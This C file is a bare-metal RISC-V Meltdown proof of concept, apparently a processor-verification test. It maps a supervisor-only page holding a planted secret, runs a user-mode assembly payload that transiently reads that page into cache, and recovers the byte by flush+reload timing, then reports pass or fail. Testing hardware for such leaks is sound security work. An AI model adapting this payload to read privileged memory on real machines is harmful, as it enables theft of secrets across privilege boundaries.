#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "encoding.h"
#include "cache.h"
#include "util.h"

#define PAGE_SIZE 4096
#define CACHE_HIT_THRESHOLD 50

#define PGSHIFT 12
#define PTES_PER_PT 512
#define CAUSE_LOAD_PAGE_FAULT 13
#define PPN(pa) (((uintptr_t)(pa) >> PGSHIFT) << 10)

#define SATP_MODE_SV39 8ULL
#define SATP_MODE 0xF000000000000000ULL

typedef uint64_t pte_t;

volatile uint64_t tohost __attribute__((section(".tohost"))) = 0;
volatile uint64_t fromhost __attribute__((section(".tohost"))) = 0;
__thread char _tdata_begin = 0;
__thread char _tdata_end = 0;
__thread char _tbss_end = 0;

// Page tables
pte_t pt[3][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
#define l1pt pt[0]
#define l2pt pt[1]
#define l3pt pt[2]

// Necessary arrays aligned to page boundaries
uint8_t probe_array[256 * PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
uint8_t dl_mem[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));
uint8_t supervisor_data[PAGE_SIZE] __attribute__((aligned(PAGE_SIZE)));

static uint8_t secret_value = 0x42;
volatile int trap_handled = 0;
uint8_t guessed_value = 0;

uintptr_t handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32]) {
    // Check if it's an expected fault (e.g. Load Page Fault = 13)
    if (cause != CAUSE_LOAD_PAGE_FAULT) {
        printf("Unexpected trap cause: %lu at epc: 0x%lx\n", cause, epc);
        exit(1);
    }

    uint64_t before, after;
    volatile uint8_t dummy;
    int result_array[256] = {0};

    // Reload step: measure access times
    for (int i = 0; i < 256; i++) {
        before = rdcycle();
        dummy = probe_array[i * PAGE_SIZE];
        after = rdcycle();
        
        if ((after - before) < CACHE_HIT_THRESHOLD) {
            result_array[i] = 1;
            guessed_value = i; 
        }
    }

    if (result_array[secret_value] == 1) {
        printf("pass: Secret leaked successfully! Guessed: 0x%02x\n", guessed_value);
    } else {
        printf("fail: Secret not leaked. Guessed: 0x%02x (expected 0x%02x)\n", guessed_value, secret_value);
    }

    trap_handled = 1;
    // End the simulation and exit gracefully or with failure code
    exit(result_array[secret_value] == 1 ? 0 : 1);
    return epc + 4; // Not reached
}

void vm_boot() {
    uintptr_t sup_pa = (uintptr_t)supervisor_data;
    int l2_idx = ((sup_pa - 0x80000000ULL) >> 21) & 0x1ff;
    
    // Safety check
    if (sup_pa < 0x80000000ULL) {
        printf("Panic: supervisor_data below DRAM_BASE\n");
        exit(1);
    }

    // Map 0x80000000 -> 0xBFFFFFFF (1GB) using L2 to allow finer mapping
    l1pt[2] = PPN(l2pt) | PTE_V;

    // Fill L2 with 2MB identity maps, all U=1
    for (int i = 0; i < PTES_PER_PT; i++) {
        uintptr_t pa = 0x80000000ULL + i * (2 * 1024 * 1024);
        l2pt[i] = PPN(pa) | PTE_V | PTE_R | PTE_W | PTE_X | PTE_A | PTE_D | PTE_U;
    }

    // Replace the specific L2 entry containing supervisor_data with a pointer to L3
    l2pt[l2_idx] = PPN(l3pt) | PTE_V;

    // Fill L3 with 4KB identity maps for this 2MB block, U=1
    for (int i = 0; i < PTES_PER_PT; i++) {
        uintptr_t pa = (0x80000000ULL + l2_idx * (2 * 1024 * 1024)) + i * (uintptr_t)PAGE_SIZE;
        l3pt[i] = PPN(pa) | PTE_V | PTE_R | PTE_W | PTE_X | PTE_A | PTE_D | PTE_U;
    }

    int l3_idx = (sup_pa >> 12) & 0x1ff;
    // U=0, R=1, W=1, X=0, mapped cleanly for Supervisor/Machine
    l3pt[l3_idx] = PPN(sup_pa) | PTE_V | PTE_R | PTE_W | PTE_A | PTE_D; 

    // Enable paging
    uintptr_t vm_choice = SATP_MODE_SV39;
    uintptr_t satp_value = ((uintptr_t)l1pt >> PGSHIFT)
                          | (vm_choice * (SATP_MODE & ~(SATP_MODE<<1)));

    // sfence before turning on paging
    asm volatile("sfence.vma zero, zero");
    write_csr(satp, satp_value);
    asm volatile("sfence.vma zero, zero");
}

void __attribute__((aligned(PAGE_SIZE))) attack_payload() {
    asm volatile(
        "mv t1, %0\n"
        "ld t2, 0(t1)\n"
        "add t1, t1, t2\n"
        "ld t1, 0(t1)\n"       
        "lb t3, 0(%1)\n"       
        "slli t3, t3, 12\n"    
        "add t4, %2, t3\n"
        "ld a1, 0(t4)\n"       
        "ld a1, 0(t4)\n"
        "ld a1, 0(t4)\n"
        : 
        : "r"(dl_mem), "r"(supervisor_data), "r"(probe_array)
        : "t1", "t2", "t3", "t4", "a1", "memory"
    );
    asm volatile("wfi");
}

int main(void) {
    printf("[*] Meltdown Attack PoC Executing...\n");
    
    // 1. Initialize data
    supervisor_data[0] = secret_value;
    *((uint64_t*)dl_mem) = 0; 

    // 2. Flush probe_array from cache completely
    for(int i = 0; i < 256; i++) {
        flushCache((uintptr_t)&probe_array[i * PAGE_SIZE], PAGE_SIZE);
    }
    
    // 3. Enable SV39 paging identifying maps and supervisor_data page mapped as U=0
    vm_boot();
    
    // 4. Drop into User-mode to execute the payload
    uintptr_t mstatus_val = read_csr(mstatus);
    
    asm volatile("sfence.vma zero, zero");
    
    uintptr_t preload_status = mstatus_val & ~(3 << 11); // Clear MPP
    preload_status |= (1 << 11);                         // Set MPP to S-mode (1)
    preload_status |= (1 << 17);                         // Set MPRV (1)
    write_csr(mstatus, preload_status);
    
    volatile uint8_t force_tlb_cache = supervisor_data[0]; 
    
    asm volatile("sfence.vma %0, zero" :: "r"(dl_mem));
    
    for(int i = 0; i < 256; i++) {
        asm volatile("sfence.vma %0, zero" :: "r"(&probe_array[i * PAGE_SIZE]));
    }
    
    mstatus_val &= ~(3 << 11); // Clear MPP (drop to U-mode)
    mstatus_val &= ~(1 << 17); // Clear MPRV (turn off privilege modification)
    write_csr(mstatus, mstatus_val);
    
    write_csr(mepc, (uintptr_t)attack_payload);
    
    // 5. Jump to attack_payload in U-mode
    asm volatile("mret");
    
    while(1);
    
    return 0;
}